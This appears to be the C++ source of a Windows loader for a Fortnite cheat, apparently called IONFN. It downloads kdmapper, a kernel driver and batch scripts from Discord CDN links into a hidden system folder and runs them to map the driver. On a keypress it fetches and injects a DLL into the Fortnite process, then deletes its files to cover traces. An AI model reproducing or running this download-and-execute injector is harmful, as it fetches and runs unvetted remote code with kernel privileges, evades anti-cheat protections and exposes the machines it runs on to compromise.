#include "imports.h"
#include <urlmon.h>
#include <iostream>
#pragma comment(lib, "urlmon.lib")
#include <stdio.h>
#include <string>
#include <windows.h>
#include <conio.h>
#define _WIN32_WINNT 0x0500
using namespace std;

int main()
{
	HWND consoleWindow = GetConsoleWindow();
	SetWindowLong(consoleWindow, GWL_STYLE, GetWindowLong(consoleWindow, GWL_STYLE) & ~WS_MAXIMIZEBOX & ~WS_SIZEBOX);
	HWND console = GetConsoleWindow();
	RECT r;
	GetWindowRect(console, &r);
	MoveWindow(console, r.left, r.top, 600, 700, TRUE);
	system("cls");
	SetConsoleTitleA("IONFN");
	items::ConsoleHandle = GetStdHandle(STD_OUTPUT_HANDLE);
	SetConsoleTextAttribute(items::ConsoleHandle, RED);
	cout << "[-] Loading Driver" << endl;
	cout << "[>] Status:" << endl;
	SetConsoleTextAttribute(items::ConsoleHandle, WHITE);
	URLDownloadToFile(NULL, L"https://cdn.discordapp.com/attachments/748646124696502342/756996836308418730/kdmapper.exe", L"C://Windows//apppatch//Custom//Custom64//kdmapper.exe", NULL, NULL);
	URLDownloadToFile(NULL, L"https://cdn.discordapp.com/attachments/748646124696502342/756990774620455002/driver.sys", L"C://Windows//apppatch//Custom//Custom64//driver.sys", NULL, NULL);
	URLDownloadToFile(NULL, L"https://cdn.discordapp.com/attachments/748646124696502342/756990779456749639/Map.bat", L"C://Windows//apppatch//Custom//Custom64//Map.bat", NULL, NULL);
	system("C://Windows//apppatch//Custom//Custom64//Map.bat");
	Sleep(1500);
	remove("C://Windows//apppatch//Custom//Custom64//kdmapper.exe");
	remove("C://Windows//apppatch//Custom//Custom64//driver.sys");
	remove("C://Windows//apppatch//Custom//Custom64//Map.bat");
	system("cls");
	items::ConsoleHandle = GetStdHandle(STD_OUTPUT_HANDLE);
	SetConsoleTextAttribute(items::ConsoleHandle, CYAN);
	cout << "\n\n\n	[+] Waiting for FortniteClient-Win64-Shipping.exe" << endl;
	while (true)
	{
		Sleep(10);
		if (items::processexists(L"FortniteClient-Win64-Shipping.exe"))
			break;
	}
	cout << "	Process found!" << endl;
	cout << "\n\n	F2 to Inject!" << endl;
	SetConsoleTextAttribute(items::ConsoleHandle, RED);
	while (true)
	{
		Sleep(10);
		if (GetAsyncKeyState(VK_F2))
		{
			cout << "[-] \nInjecting" << endl;
			SetConsoleTextAttribute(items::ConsoleHandle, WHITE);
			URLDownloadToFile(NULL, L"https://cdn.discordapp.com/attachments/748646124696502342/756990770359173161/modmap.exe", L"C://Windows//apppatch//Custom//Custom64//modmap.exe", NULL, NULL);
			URLDownloadToFile(NULL, L"https://cdn.discordapp.com/attachments/748646124696502342/756990772863172729/Inject.bat", L"C://Windows//apppatch//Custom//Custom64//Inject.bat", NULL, NULL);
			URLDownloadToFile(NULL, L"https://cdn.discordapp.com/attachments/748646124696502342/756990782317002802/Fortnite.dll", L"C://Windows//apppatch//Custom//Custom64//Fortnite.dll", NULL, NULL);
			system("C://Windows//apppatch//Custom//Custom64//Inject.bat");
			system("cls");
			Sleep(800);
			remove("C://Windows//apppatch//Custom//Custom64//modmap.exe");
			remove("C://Windows//apppatch//Custom//Custom64//Inject.bat");
			remove("C://Windows//apppatch//Custom//Custom64//Fortnite.dll");
			system("cls");
			SetConsoleTextAttribute(items::ConsoleHandle, CYAN);
			cout << "[i] Exiting in 5 seconds" << endl;
			Sleep(5000);
			exit(1);
		}
	}
}
